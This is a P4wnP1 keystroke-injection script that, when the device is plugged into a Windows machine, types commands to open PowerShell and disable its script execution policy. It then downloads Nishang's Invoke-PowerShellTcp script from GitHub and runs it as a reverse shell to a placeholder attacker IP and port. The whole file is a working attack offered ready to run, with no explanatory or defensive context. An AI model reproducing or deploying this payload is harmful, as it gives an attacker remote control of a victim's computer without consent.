function reverse_shell()
{
  // open Windows Run prompt
  press("WIN R");
  delay(100);

  // open powershell.exe
  type("powershell.exe");
  delay(100);
  press("ENTER");

  // set the current user's powershell script execution policy to unrestricted
  // to run powershell scripts
  type("Set-ExecutionPolicy Unrestricted -Scope CurrentUser");
  delay(100);
  press("ENTER");  

  // download Nishang powershell script
  type("IWR -Uri 'https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1' -Outfile './r.ps1'");
  delay(100);
  press("ENTER");

  // append reverse shell line to Nishang file
  type("echo 'Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PORT]' >> r.ps1");
  delay(100);
  press("ENTER");

  // execute powershell script
  type("./r.ps1");
  delay(100);
  press("ENTER");

  // close powershell
  press("ALT 4");
}

reverse_shell();

// run with:
// P4wnP1_cli hid run powershell_reverse_shell.js
